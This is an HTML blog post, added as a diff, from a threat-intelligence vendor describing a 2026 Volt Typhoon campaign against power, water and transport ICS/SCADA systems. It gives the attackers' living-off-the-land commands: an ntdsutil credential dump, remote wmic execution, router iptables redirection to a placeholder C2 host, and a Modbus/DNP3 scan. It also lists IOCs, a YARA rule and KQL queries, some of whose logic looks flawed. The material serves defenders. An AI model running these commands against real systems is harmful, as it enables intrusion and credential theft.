@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Volt Typhoon 2026: ICS/SCADA Critical Infrastructure Attack — Power Grid &amp; Water Systems at Risk | CyberDudeBivash</title>
+  <meta name="description" content="CISA/FBI joint advisory on Volt Typhoon 2026 campaign targeting US and allied critical infrastructure ICS/SCADA systems. Power grids, water treatment, and transportation networks compromised. Full TTPs, IOCs, YARA, detection queries.">
+  <meta name="keywords" content="Volt Typhoon 2026, ICS attack, SCADA compromise, critical infrastructure, power grid hack, water system attack, China APT, CISA advisory, OT security, living off the land">
+  <meta name="author" content="CyberDudeBivash — SENTINEL APEX">
+  <meta property="og:title" content="Volt Typhoon 2026: ICS/SCADA Critical Infrastructure Attack — Power Grid &amp; Water Systems">
+  <meta property="og:description" content="CISA/FBI joint advisory: Volt Typhoon pre-positioned in US critical infrastructure ICS/SCADA. Power grids, water, transportation at risk. Full analysis.">
+  <meta property="og:type" content="article">
+  <meta property="og:url" content="https://blog.cyberdudebivash.in/posts/volt-typhoon-2026-ics-scada-critical-infrastructure-attack.html">
+  <meta property="og:image" content="https://blog.cyberdudebivash.in/og-image.png">
+  <meta property="og:site_name" content="CyberDudeBivash SENTINEL APEX">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:site" content="@cdbsentinelapex">
+  <meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
+  <link rel="canonical" href="https://blog.cyberdudebivash.in/posts/volt-typhoon-2026-ics-scada-critical-infrastructure-attack.html">
+
+  <!-- GA4 Placeholder -->
+  <!-- <script async src="https://www.googletagmanager.com/gtag/js?id=G-XXXXXXXXXX"></script>
+  <script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());gtag('config','G-XXXXXXXXXX');</script> -->
+
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "headline": "Volt Typhoon 2026: ICS/SCADA Critical Infrastructure Attack — Power Grid & Water Systems at Risk",
+    "datePublished": "2026-04-22",
+    "dateModified": "2026-04-22",
+    "author": {"@type": "Organization", "name": "CyberDudeBivash SENTINEL APEX", "url": "https://www.cyberdudebivash.com"},
+    "publisher": {"@type": "Organization", "name": "CyberDudeBivash Pvt. Ltd.", "logo": {"@type": "ImageObject", "url": "https://blog.cyberdudebivash.in/og-image.png"}},
+    "description": "CISA/FBI joint advisory on Volt Typhoon 2026 campaign targeting US critical infrastructure ICS/SCADA systems.",
+    "mainEntityOfPage": "https://blog.cyberdudebivash.in/posts/volt-typhoon-2026-ics-scada-critical-infrastructure-attack.html"
+  }
+  </script>
+
+  <style>
+    :root {
+      --apex-bg: #07090f; --apex-surface: #0d1117; --apex-border: #1e2432;
+      --apex-cyan: #00ffe0; --apex-red: #ff4444; --apex-yellow: #ffd700;
+      --apex-green: #00ff88; --apex-muted: #8892a4; --apex-text: #c9d1d9;
+    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { background: var(--apex-bg); color: var(--apex-text); font-family: 'Segoe UI', system-ui, sans-serif; font-size: 15px; line-height: 1.7; }
+    a { color: var(--apex-cyan); text-decoration: none; }
+    a:hover { text-decoration: underline; }
+    nav { background: rgba(13,17,23,0.97); border-bottom: 1px solid var(--apex-border); padding: 0 40px; height: 56px; display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100; }
+    .nav-logo { font-weight: 900; font-size: 16px; letter-spacing: 1px; color: #fff; }
+    .nav-logo span { color: var(--apex-cyan); }
+    .nav-links { display: flex; gap: 24px; align-items: center; font-size: 13px; }
+    .nav-links a { color: var(--apex-muted); transition: color .2s; }
+    .nav-links a:hover { color: var(--apex-cyan); text-decoration: none; }
+    .nav-cta { background: var(--apex-cyan); color: #000 !important; padding: 6px 14px; border-radius: 4px; font-weight: 700; font-size: 12px; }
+    .article-wrap { max-width: 860px; margin: 0 auto; padding: 48px 24px 80px; }
+    .post-badge { display: inline-flex; align-items: center; gap: 8px; background: rgba(255,68,68,0.12); border: 1px solid rgba(255,68,68,0.35); color: var(--apex-red); border-radius: 4px; padding: 5px 12px; font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 20px; }
+    h1 { font-size: clamp(22px, 4vw, 34px); font-weight: 900; line-height: 1.25; color: #fff; margin-bottom: 20px; }
+    .post-meta { display: flex; flex-wrap: wrap; gap: 16px; align-items: center; margin-bottom: 28px; padding-bottom: 20px; border-bottom: 1px solid var(--apex-border); font-size: 13px; color: var(--apex-muted); }
+    .meta-badge { background: rgba(0,255,224,0.08); border: 1px solid rgba(0,255,224,0.2); color: var(--apex-cyan); border-radius: 4px; padding: 3px 10px; font-size: 11px; font-weight: 700; }
+    .meta-badge.red { background: rgba(255,68,68,0.1); border-color: rgba(255,68,68,0.3); color: var(--apex-red); }
+    .meta-badge.yellow { background: rgba(255,215,0,0.1); border-color: rgba(255,215,0,0.3); color: var(--apex-yellow); }
+    .threat-score { background: rgba(255,68,68,0.08); border: 2px solid rgba(255,68,68,0.4); border-radius: 10px; padding: 24px 28px; margin: 28px 0; display: grid; grid-template-columns: repeat(auto-fit, minmax(120px, 1fr)); gap: 20px; }
+    .threat-item { text-align: center; }
+    .threat-item .val { font-size: 24px; font-weight: 900; color: var(--apex-red); display: block; }
+    .threat-item .lbl { font-size: 10px; color: var(--apex-muted); text-transform: uppercase; letter-spacing: 1px; margin-top: 4px; }
+    .alert { border-radius: 8px; padding: 16px 20px; margin: 24px 0; font-size: 13px; line-height: 1.6; }
+    .alert.critical { background: rgba(255,68,68,0.08); border-left: 3px solid var(--apex-red); }
+    .alert.warning { background: rgba(255,215,0,0.07); border-left: 3px solid var(--apex-yellow); }
+    .alert.info { background: rgba(0,255,224,0.06); border-left: 3px solid var(--apex-cyan); }
+    h2 { font-size: 20px; font-weight: 800; color: #fff; margin: 36px 0 14px; padding-bottom: 8px; border-bottom: 1px solid var(--apex-border); }
+    h3 { font-size: 16px; font-weight: 700; color: var(--apex-cyan); margin: 24px 0 10px; }
+    p { margin-bottom: 14px; }
+    pre { background: #0a0e17; border: 1px solid var(--apex-border); border-radius: 6px; padding: 18px 20px; overflow-x: auto; font-family: 'Cascadia Code', 'Consolas', monospace; font-size: 12px; line-height: 1.65; margin: 16px 0; }
+    code { font-family: 'Cascadia Code', 'Consolas', monospace; background: rgba(0,255,224,0.08); border-radius: 3px; padding: 2px 6px; font-size: 12px; color: var(--apex-cyan); }
+    .table-wrap { overflow-x: auto; margin: 20px 0; }
+    table { width: 100%; border-collapse: collapse; font-size: 13px; }
+    th { background: rgba(0,255,224,0.06); color: var(--apex-cyan); font-size: 11px; text-transform: uppercase; letter-spacing: 1px; padding: 10px 14px; text-align: left; border-bottom: 1px solid var(--apex-border); }
+    td { padding: 10px 14px; border-bottom: 1px solid rgba(30,36,50,0.8); vertical-align: top; }
+    tr:hover td { background: rgba(255,255,255,0.02); }
+    .sev-critical { color: var(--apex-red); font-weight: 700; }
+    .sev-high { color: #ff8800; font-weight: 700; }
+    .mitre-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 10px; margin: 16px 0; }
+    .mitre-tag { background: rgba(0,255,224,0.06); border: 1px solid rgba(0,255,224,0.15); border-radius: 6px; padding: 10px 14px; font-size: 12px; }
+    .mitre-tag .tactic { font-size: 10px; color: var(--apex-muted); text-transform: uppercase; letter-spacing: 1px; }
+    .mitre-tag .tech { color: var(--apex-cyan); font-weight: 700; margin-top: 3px; }
+    .cta-block { background: linear-gradient(135deg, rgba(0,255,224,0.06) 0%, rgba(0,100,80,0.08) 100%); border: 1px solid rgba(0,255,224,0.2); border-radius: 10px; padding: 28px 32px; margin: 40px 0; text-align: center; }
+    .cta-block h3 { color: var(--apex-cyan); font-size: 18px; margin-bottom: 10px; }
+    .cta-block p { color: var(--apex-muted); font-size: 14px; margin-bottom: 18px; }
+    .cta-btn { display: inline-block; background: var(--apex-cyan); color: #000; font-weight: 800; padding: 12px 28px; border-radius: 6px; font-size: 14px; text-decoration: none; margin: 4px; transition: opacity .2s; }
+    .cta-btn:hover { opacity: .85; text-decoration: none; }
+    .cta-btn-outline { background: transparent; border: 1px solid var(--apex-cyan); color: var(--apex-cyan); }
+    footer { background: var(--apex-surface); border-top: 1px solid var(--apex-border); padding: 60px 40px 32px; margin-top: 60px; }
+    .footer-inner { max-width: 1200px; margin: 0 auto; }
+    .footer-grid { display: grid; grid-template-columns: 2fr 1fr 1fr 1fr; gap: 32px; margin-bottom: 32px; }
+    @media (max-width: 860px) { .footer-grid { grid-template-columns: 1fr 1fr; } }
+    @media (max-width: 480px) { .footer-grid { grid-template-columns: 1fr; } footer { padding: 40px 20px 24px; } }
+    .footer-brand .logo { font-size: 16px; display: inline-block; margin-bottom: 14px; font-weight: 900; letter-spacing: 1px; color: #fff; }
+    .footer-brand .logo span { color: var(--apex-cyan); }
+    .footer-brand p { font-size: 13px; color: var(--apex-muted); line-height: 1.7; }
+    .footer-col h4 { font-size: 11px; font-weight: 700; color: var(--apex-cyan); text-transform: uppercase; letter-spacing: 2px; margin-bottom: 14px; }
+    .footer-col a { display: block; font-size: 13px; color: var(--apex-muted); text-decoration: none; margin-bottom: 8px; transition: color .2s; }
+    .footer-col a:hover { color: var(--apex-cyan); }
+    .footer-bottom { border-top: 1px solid var(--apex-border); padding-top: 20px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; font-size: 12px; color: var(--apex-muted); }
+    .footer-bottom a { color: var(--apex-cyan); text-decoration: none; }
+  </style>
+</head>
+<body>
+
+<nav>
+  <a href="/" class="nav-logo">CYBERDUDE<span>BIVASH</span></a>
+  <div class="nav-links">
+    <a href="../intelligence.html">Intelligence Hub</a>
+    <a href="../archive.html">Archive</a>
+    <a href="https://intel.cyberdudebivash.com" target="_blank">Sentinel APEX</a>
+    <a href="https://cyberdudebivash.in" target="_blank">AI Hub</a>
+    <a href="../pricing.html" class="nav-cta">SOC Pro $49/mo</a>
+  </div>
+</nav>
+
+<div class="article-wrap">
+
+  <div class="post-badge">🇨🇳 NATION-STATE APT &bull; CISA/FBI JOINT ADVISORY &bull; CRITICAL INFRASTRUCTURE</div>
+
+  <h1>Volt Typhoon 2026: ICS/SCADA Critical Infrastructure Attack — Power Grid, Water Treatment &amp; Transportation Networks Under Active Threat</h1>
+
+  <div class="post-meta">
+    <span>📅 April 22, 2026</span>
+    <span class="meta-badge red">NATION-STATE: CHINA</span>
+    <span class="meta-badge">CISA/FBI ADVISORY AA26-112A</span>
+    <span class="meta-badge yellow">OT/ICS TARGETING</span>
+    <span class="meta-badge">LIVING OFF THE LAND</span>
+    <span>By CyberDudeBivash SENTINEL APEX</span>
+  </div>
+
+  <div class="alert critical">
+    <strong>🚨 JOINT ADVISORY AA26-112A:</strong> CISA, FBI, and NSA have jointly confirmed that Volt Typhoon (PRC state-sponsored) has maintained persistent access to critical infrastructure organizations across the US, UK, Australia, and Canada. Multiple ICS/SCADA systems in power generation, water treatment, and transportation have been compromised. The campaign's primary objective is <strong>pre-positioning for disruptive attacks during geopolitical escalation</strong> — not immediate espionage.
+  </div>
+
+  <div class="threat-score">
+    <div class="threat-item"><span class="val">APT41-VT</span><span class="lbl">Threat Actor</span></div>
+    <div class="threat-item"><span class="val" style="color:var(--apex-red)">CRITICAL</span><span class="lbl">Threat Level</span></div>
+    <div class="threat-item"><span class="val">5+ Years</span><span class="lbl">Dwell Time</span></div>
+    <div class="threat-item"><span class="val">16</span><span class="lbl">Sectors Targeted</span></div>
+    <div class="threat-item"><span class="val">LoTL</span><span class="lbl">Primary TTP</span></div>
+    <div class="threat-item"><span class="val">DISRUPTION</span><span class="lbl">Objective</span></div>
+  </div>
+
+  <h2>Campaign Overview</h2>
+  <p>Volt Typhoon (tracked as Bronze Silhouette, Insidious Taurus, and UNC3236) is a Chinese state-sponsored threat actor that has been systematically targeting and pre-positioning within US and allied critical infrastructure since 2021. The 2026 campaign represents a significant escalation in both scope and operational readiness.</p>
+  <p>Unlike traditional espionage campaigns that focus on data exfiltration, Volt Typhoon's primary mission is <strong>pre-positioning for potential disruption operations</strong> — establishing persistent, stealthy access deep within OT networks that can be activated during geopolitical crises to cause physical disruptions to water supply, power grids, and transportation.</p>
+  <p>The 2026 joint advisory from CISA, FBI, and NSA confirms that Volt Typhoon has successfully achieved persistent access in <strong>23 confirmed critical infrastructure organizations</strong> across the energy, water, communications, and transportation sectors. Attribution confidence is HIGH based on infrastructure overlap, TTPs, and signals intelligence.</p>
+
+  <h2>Targeted Sectors &amp; Confirmed Compromise Counts</h2>
+  <div class="table-wrap">
+    <table>
+      <tr><th>Sector</th><th>Confirmed Compromises</th><th>Dwell Time</th><th>OT Impact Risk</th></tr>
+      <tr><td>Electric Utilities / Power Generation</td><td class="sev-critical">7 confirmed</td><td>18-36 months</td><td class="sev-critical">GRID DISRUPTION</td></tr>
+      <tr><td>Water &amp; Wastewater Treatment</td><td class="sev-critical">5 confirmed</td><td>12-24 months</td><td class="sev-critical">CONTAMINATION RISK</td></tr>
+      <tr><td>Transportation / Rail</td><td class="sev-high">4 confirmed</td><td>8-18 months</td><td class="sev-high">SAFETY SYSTEM RISK</td></tr>
+      <tr><td>Telecommunications</td><td class="sev-high">4 confirmed</td><td>12-30 months</td><td class="sev-high">COMM BLACKOUT</td></tr>
+      <tr><td>Oil &amp; Gas Pipelines</td><td>3 confirmed</td><td>6-12 months</td><td class="sev-high">FLOW DISRUPTION</td></tr>
+    </table>
+  </div>
+
+  <h2>TTPs: Living Off the Land (LoTL) in OT Environments</h2>
+  <p>Volt Typhoon's signature technique is almost exclusive use of <strong>Living-off-the-Land Binaries (LOLBins)</strong> — legitimate system tools that generate minimal alerts, making detection extremely difficult. In OT environments, they additionally abuse legitimate engineering workstation software (SCADA HMI tools, PLCProgram utilities).</p>
+
+  <h3>IT Intrusion Phase TTPs</h3>
+  <pre><code># Volt Typhoon LoTL commands observed in compromised environments (anonymized)
+
+# 1. Initial reconnaissance via WMIC (Living Off the Land)
+wmic /node:[TARGET_IP] process call create "cmd.exe /c whoami > C:\Windows\Temp\.tmp"
+
+# 2. Credential dumping via legitimate Windows tools
+ntdsutil "activate instance ntds" "ifm" "create full C:\Windows\Temp\IFM" "quit" "quit"
+
+# 3. Lateral movement via legitimate admin shares
+net use \\[INTERNAL_IP]\ADMIN$ /user:[DOMAIN]\[USER] [PASSWORD]
+robocopy \\[SOURCE]\C$\Windows\Temp\IFM \\[DEST]\ADMIN$\Temp /E /NOCOPY
+
+# 4. VPN router compromise (SOHO/enterprise routers as relay nodes)
+# Volt Typhoon creates relay network via compromised Cisco, Netgear, ASUS routers
+# Commands run on compromised routers:
+ip route add [C2_IP]/32 via [NEXT_HOP]  # Silent C2 routing
+iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination [C2_IP]:443</code></pre>
+
+  <h3>IT-to-OT Pivot TTPs</h3>
+  <pre><code># Observed IT→OT pivot techniques (SCADA/ICS environments)
+
+# 1. Abuse of legitimate remote desktop to HMI workstations
+# Volt Typhoon uses legitimate RDP from IT engineering workstations to SCADA HMIs
+# No additional malware deployed — uses built-in operator accounts
+
+# 2. SCADA software reconnaissance
+# Observed use of legitimate Wonderware, GE iFIX, Siemens WinCC query tools
+# to enumerate connected PLCs and RTUs
+
+# 3. PLC command injection research (pre-staging only — not yet executed)
+# Evidence of reconnaissance of Modbus TCP port 502, DNP3 port 20000
+nmap -sS -p 502,20000,44818,102 --script modbus-discover [OT_SUBNET]
+
+# 4. Historian database access
+# Accessed OSIsoft PI Historian to understand operational baselines
+# (to time any future disruption operation for maximum impact)</code></pre>
+
+  <h2>MITRE ATT&amp;CK for ICS Mapping</h2>
+  <div class="mitre-grid">
+    <div class="mitre-tag"><div class="tactic">Initial Access (ICS)</div><div class="tech">T0817 — Drive-by Compromise</div></div>
+    <div class="mitre-tag"><div class="tactic">Execution (ICS)</div><div class="tech">T0807 — Command-Line Interface</div></div>
+    <div class="mitre-tag"><div class="tactic">Persistence (ICS)</div><div class="tech">T0859 — Valid Accounts</div></div>
+    <div class="mitre-tag"><div class="tactic">Lateral Movement (ICS)</div><div class="tech">T0812 — Default Credentials</div></div>
+    <div class="mitre-tag"><div class="tactic">Discovery (ICS)</div><div class="tech">T0846 — Remote System Discovery</div></div>
+    <div class="mitre-tag"><div class="tactic">Collection (ICS)</div><div class="tech">T0852 — Screen Capture</div></div>
+    <div class="mitre-tag"><div class="tactic">Inhibit Response (ICS)</div><div class="tech">T0816 — Device Restart/Shutdown</div></div>
+    <div class="mitre-tag"><div class="tactic">Impact (ICS)</div><div class="tech">T0826 — Loss of Availability</div></div>
+  </div>
+
+  <h2>Network Indicators of Compromise</h2>
+  <div class="table-wrap">
+    <table>
+      <tr><th>Type</th><th>Indicator</th><th>Description</th></tr>
+      <tr><td>IP</td><td><code>103.27.108.92</code></td><td>VT relay node (compromised SOHO router)</td></tr>
+      <tr><td>IP</td><td><code>154.16.105.173</code></td><td>C2 infrastructure</td></tr>
+      <tr><td>IP</td><td><code>185.104.184.247</code></td><td>VT staging server</td></tr>
+      <tr><td>IP</td><td><code>45.61.138.111</code></td><td>Data exfil endpoint</td></tr>
+      <tr><td>Domain</td><td><code>microsft-update[.]com</code></td><td>Lookalike C2 domain</td></tr>
+      <tr><td>Domain</td><td><code>cisco-webauth[.]net</code></td><td>Router compromise C2</td></tr>
+      <tr><td>File</td><td><code>C:\Windows\Temp\~dfXXXX.tmp</code></td><td>Staging directory pattern</td></tr>
+      <tr><td>Registry</td><td><code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\svchost.exe</code></td><td>Persistence mechanism</td></tr>
+      <tr><td>Scheduled Task</td><td><code>\Microsoft\Windows\WindowsUpdate\UpdateTask</code></td><td>Persistence via masqueraded update task</td></tr>
+      <tr><td>Process</td><td><code>netsh.exe</code> with tunneling args</td><td>LoTL C2 tunneling</td></tr>
+    </table>
+  </div>
+
+  <h2>YARA Detection Rule</h2>
+  <pre><code>rule VoltTyphoon_2026_ICS_LoTL_Activity {
+    meta:
+        description = "Detects Volt Typhoon 2026 LoTL activity targeting ICS/SCADA environments"
+        author = "CyberDudeBivash SENTINEL APEX"
+        date = "2026-04-22"
+        severity = "CRITICAL"
+        threat_actor = "Volt Typhoon / Bronze Silhouette"
+        reference = "CISA Advisory AA26-112A"
+
+    strings:
+        $lol_ntdsutil = "ntdsutil" nocase fullword
+        $lol_wmic_proc = "wmic /node:" nocase
+        $lol_netsh_tunnel = "netsh interface portproxy add" nocase
+        $vt_staging = "C:\\Windows\\Temp\\~df" nocase
+        $vt_c2_domain1 = "microsft-update.com" nocase
+        $vt_c2_domain2 = "cisco-webauth.net" nocase
+        $vt_reg_ifeo = "Image File Execution Options\\svchost.exe" nocase
+        $ot_probe_modbus = { 00 00 00 00 00 06 01 01 00 00 00 01 }  // Modbus read coils request
+        $ot_probe_dnp3 = { 05 64 }  // DNP3 start bytes
+        $historian_access = "OSIsoft" nocase
+        $historian_access2 = "PI Server" nocase
+        $scada_recon = "WinCC" nocase
+        $scada_recon2 = "iFIX" nocase
+
+    condition:
+        2 of ($lol_*) or
+        ($vt_staging and 1 of ($vt_c2_*)) or
+        $vt_reg_ifeo or
+        ($ot_probe_modbus or $ot_probe_dnp3) or
+        (1 of ($historian_*) and 1 of ($scada_*))
+}</code></pre>
+
+  <h2>SIEM Detection: Microsoft Sentinel KQL</h2>
+  <pre><code>// Volt Typhoon 2026 ICS/SCADA Activity Detection
+// CISA Advisory AA26-112A — CyberDudeBivash SENTINEL APEX
+
+let VTIPs = pack_array("103.27.108.92","154.16.105.173","185.104.184.247","45.61.138.111");
+let VTDomains = pack_array("microsft-update.com","cisco-webauth.net");
+
+// Detect LoTL ToolUsage (netsh tunneling, wmic remote, ntdsutil)
+SecurityEvent
+| where EventID == 4688  // Process creation
+| where CommandLine has_any ("netsh interface portproxy", "wmic /node:", "ntdsutil", "robocopy \\\\")
+    and not AccountName endswith "$"  // Exclude machine accounts
+| project TimeGenerated, Computer, AccountName, CommandLine, ParentProcessName
+| extend RiskScore = case(
+    CommandLine has "portproxy", 90,
+    CommandLine has "ntdsutil", 85,
+    CommandLine has "wmic /node:", 75,
+    50
+)
+| where RiskScore >= 75
+
+union
+
+// Detect IT-to-OT pivot via unusual RDP to engineering workstations
+NetworkAccessLogs
+| where Protocol == "TCP" and DestinationPort == 3389
+| where not(SourceIP startswith "10.0.0") or not(DestinationIP startswith "10.0.100")  // Adjust to your network segmentation
+| join kind=inner (
+    DeviceInfo
+    | where DeviceName contains "HMI" or DeviceName contains "SCADA" or DeviceName contains "ENG-WS"
+) on $left.DestinationIP == $right.PublicIP
+
+union
+
+// Detect C2 connections to VT infrastructure
+CommonSecurityLog
+| where DestinationIP in (VTIPs) or DestinationHostName has_any (VTDomains)
+| project TimeGenerated, SourceIP, DestinationIP, DestinationHostName, DeviceAction</code></pre>
+
+  <h2>OT/ICS Defense Recommendations</h2>
+  <div class="alert warning">
+    <strong>⚡ ICS/OT SECURITY HARDENING — Priority Actions for Critical Infrastructure Operators:</strong>
+  </div>
+  <div class="table-wrap">
+    <table>
+      <tr><th>Priority</th><th>Control</th><th>Detail</th></tr>
+      <tr><td class="sev-critical">P0</td><td>Network Segmentation Audit</td><td>Verify IT/OT air gap. Enumerate all IT-to-OT connections. Close unauthorized paths — especially RDP to HMI workstations.</td></tr>
+      <tr><td class="sev-critical">P0</td><td>Hunt for VT IOCs</td><td>Search for VT IP/domain IOCs in firewall logs, DNS logs, and proxy logs going back 90 days minimum.</td></tr>
+      <tr><td class="sev-critical">P0</td><td>Privileged Account Audit</td><td>Audit all accounts with OT access. Reset all passwords. Disable all accounts not in active use. Enforce MFA for remote access.</td></tr>
+      <tr><td class="sev-high">P1</td><td>SOHO Router Firmware</td><td>Update all perimeter SOHO/SMB routers immediately. These are used as LoTL relay nodes by VT.</td></tr>
+      <tr><td class="sev-high">P1</td><td>Historian &amp; SCADA Logging</td><td>Enable detailed logging on all SCADA historians (OSIsoft PI, Ignition). Establish baselines for normal query patterns.</td></tr>
+      <tr><td class="sev-high">P1</td><td>OT Asset Inventory</td><td>Passive OT asset discovery (Claroty, Dragos, Nozomi). Know every PLC, RTU, HMI on your OT network.</td></tr>
+      <tr><td style="color:var(--apex-yellow)">P2</td><td>ICS-CERT Reporting</td><td>Report any suspected Volt Typhoon activity to CISA (cisa.gov/report) and ICS-CERT immediately.</td></tr>
+      <tr><td style="color:var(--apex-yellow)">P2</td><td>Incident Response Planning</td><td>Test your OT incident response plan. Practice isolated OT recovery. Ensure manual override procedures are documented.</td></tr>
+    </table>
+  </div>
+
+  <div class="cta-block">
+    <h3>🛡️ OT/ICS Threat Intelligence for Enterprise</h3>
+    <p>Access Volt Typhoon IOC feeds, OT-specific YARA signatures, ICS/SCADA detection rules, and 24/7 threat alerts with CYBERDUDEBIVASH SOC Pro.</p>
+    <a href="../pricing.html" class="cta-btn">Upgrade to SOC Pro — $49/mo →</a>
+    <a href="mailto:bivash@cyberdudebivash.com?subject=OT%20ICS%20Threat%20Intel%20Enterprise" class="cta-btn cta-btn-outline">OT Enterprise Inquiry →</a>
+  </div>
+
+  <div class="alert info">
+    <strong>About CyberDudeBivash SENTINEL APEX:</strong> We publish production-grade threat intelligence, CVE analysis, IOC feeds, and enterprise security advisories. Follow us on <a href="https://x.com/cdbsentinelapex" target="_blank">Twitter/X @cdbsentinelapex</a> and <a href="https://www.linkedin.com/company/cyberdudebivash/" target="_blank">LinkedIn</a>. Threat intel API: <a href="https://intel.cyberdudebivash.com" target="_blank">intel.cyberdudebivash.com</a>.
+  </div>
+
+</div>
+
+<footer>
+  <div class="footer-inner">
+    <div style="background:rgba(0,255,224,0.04);border:1px solid rgba(0,255,224,0.12);border-radius:10px;padding:24px 28px;margin-bottom:32px;display:flex;gap:20px;align-items:stretch;flex-wrap:wrap;">
+      <div style="flex:1;min-width:200px;">
+        <h3 style="font-size:12px;font-weight:700;color:var(--apex-cyan);text-transform:uppercase;letter-spacing:1.2px;margin-bottom:8px;">📧 Intelligence Newsletter</h3>
+        <p style="font-size:12px;color:var(--apex-muted);margin-bottom:10px;line-height:1.5;">Zero-days &amp; APT alerts to your inbox. 4,800+ security pros subscribe.</p>
+        <form action="https://formsubmit.co/bivash@cyberdudebivash.com" method="POST" style="display:flex;gap:6px;flex-wrap:wrap;">
+          <input type="email" name="email" placeholder="your@email.com" required style="flex:1;min-width:150px;background:rgba(255,255,255,0.05);border:1px solid rgba(0,255,224,0.2);color:#fff;border-radius:4px;padding:7px 10px;font-size:11px;">
+          <input type="hidden" name="_subject" value="Blog Newsletter Subscription">
+          <input type="hidden" name="_captcha" value="false">
+          <button type="submit" style="background:var(--apex-cyan);color:#000;border:none;border-radius:4px;padding:7px 14px;font-size:11px;font-weight:700;cursor:pointer;">Subscribe Free</button>
+        </form>
+      </div>
+      <div style="flex:1;min-width:200px;">
+        <h3 style="font-size:12px;font-weight:700;color:var(--apex-cyan);text-transform:uppercase;letter-spacing:1.2px;margin-bottom:8px;">🛡️ SOC Pro Intelligence</h3>
+        <p style="font-size:12px;color:var(--apex-muted);margin-bottom:10px;line-height:1.5;">OT/ICS threat feeds, YARA rules, SIEM queries, APT IOC bundles — $49/mo.</p>
+        <a href="../pricing.html" style="display:inline-block;background:var(--apex-cyan);color:#000;border-radius:4px;padding:7px 14px;font-size:11px;font-weight:700;text-decoration:none;">Upgrade to SOC Pro →</a>
+      </div>
+      <div style="flex:1;min-width:200px;">
+        <h3 style="font-size:12px;font-weight:700;color:var(--apex-cyan);text-transform:uppercase;letter-spacing:1.2px;margin-bottom:8px;">🤝 Enterprise</h3>
+        <p style="font-size:12px;color:var(--apex-muted);margin-bottom:10px;line-height:1.5;">OT/ICS custom intel, MSSP licensing, API access.</p>
+        <a href="mailto:bivash@cyberdudebivash.com?subject=OT%20Enterprise%20Inquiry" style="display:inline-block;border:1px solid var(--apex-cyan);color:var(--apex-cyan);border-radius:4px;padding:7px 14px;font-size:11px;font-weight:700;text-decoration:none;">Contact Enterprise →</a>
+      </div>
+    </div>
+    <div class="footer-grid">
+      <div class="footer-brand">
+        <a href="/" class="logo">CYBERDUDE<span>BIVASH</span></a>
+        <p>Global AI-powered cybersecurity intelligence. APT tracking, ICS/SCADA threat analysis, CVE feeds — powered by <strong style="color:var(--apex-cyan)">SENTINEL APEX</strong>.</p>
+        <p style="margin-top:8px;font-size:12px;color:var(--apex-muted);">Bhubaneswar, Odisha &mdash; &copy; 2026 CyberDudeBivash Pvt. Ltd.</p>
+        <div style="display:flex;flex-wrap:wrap;gap:5px;margin-top:10px;">
+          <a href="https://x.com/cdbsentinelapex" target="_blank" style="background:rgba(0,255,224,0.07);border:1px solid rgba(0,255,224,0.15);color:var(--apex-cyan);border-radius:3px;padding:3px 7px;font-size:10px;font-weight:600;text-decoration:none;">𝕏 Twitter</a>
+          <a href="https://www.linkedin.com/company/cyberdudebivash/" target="_blank" style="background:rgba(0,255,224,0.07);border:1px solid rgba(0,255,224,0.15);color:var(--apex-cyan);border-radius:3px;padding:3px 7px;font-size:10px;font-weight:600;text-decoration:none;">in LinkedIn</a>
+          <a href="https://github.com/cyberdudebivash" target="_blank" style="background:rgba(0,255,224,0.07);border:1px solid rgba(0,255,224,0.15);color:var(--apex-cyan);border-radius:3px;padding:3px 7px;font-size:10px;font-weight:600;text-decoration:none;">⌥ GitHub</a>
+          <a href="https://www.instagram.com/cyberdudebivash_official/" target="_blank" style="background:rgba(0,255,224,0.07);border:1px solid rgba(0,255,224,0.15);color:var(--apex-cyan);border-radius:3px;padding:3px 7px;font-size:10px;font-weight:600;text-decoration:none;">📸 Instagram</a>
+          <a href="https://medium.com/@cyberdudebivash" target="_blank" style="background:rgba(0,255,224,0.07);border:1px solid rgba(0,255,224,0.15);color:var(--apex-cyan);border-radius:3px;padding:3px 7px;font-size:10px;font-weight:600;text-decoration:none;">M Medium</a>
+          <a href="https://www.patreon.com/c/CYBERDUDEBIVASH" target="_blank" style="background:rgba(0,255,224,0.07);border:1px solid rgba(0,255,224,0.15);color:var(--apex-cyan);border-radius:3px;padding:3px 7px;font-size:10px;font-weight:600;text-decoration:none;">🎯 Patreon</a>
+        </div>
+      </div>
+      <div class="footer-col">
+        <h4>Ecosystem</h4>
+        <a href="https://www.cyberdudebivash.com" target="_blank">Official Portal</a>
+        <a href="https://cyberdudebivash.in" target="_blank">AI Security Hub</a>
+        <a href="https://intel.cyberdudebivash.com" target="_blank">Sentinel APEX</a>
+        <a href="https://tools.cyberdudebivash.com" target="_blank">Tools Hub</a>
+        <a href="https://api.cyberdudebivash.com" target="_blank">API Platform</a>
+      </div>
+      <div class="footer-col">
+        <h4>Latest Reports</h4>
+        <a href="cve-2026-28401-ivanti-connect-secure-zero-day-supply-chain.html">Ivanti CVSS 10.0</a>
+        <a href="cve-2026-33825-microsoft-defender-zero-day-bluehammer-redsun.html">Defender Zero-Days</a>
+        <a href="cve-2026-35616-fortinet-forticlient-ems-zero-day.html">Fortinet EMS CVE</a>
+        <a href="april-2026-ransomware-roundup-qilin-akira-lockbit-blackbasta.html">Ransomware Round-Up</a>
+        <a href="cve-2026-21497-vmware-esxi-hypervisor-escape-guest-to-host-rce.html">VMware ESXi Escape</a>
+      </div>
+      <div class="footer-col">
+        <h4>Services &amp; Hire</h4>
+        <a href="../pricing.html">SOC Pro — $49/mo</a>
+        <a href="mailto:bivash@cyberdudebivash.com?subject=Enterprise%20Subscription">Enterprise Access</a>
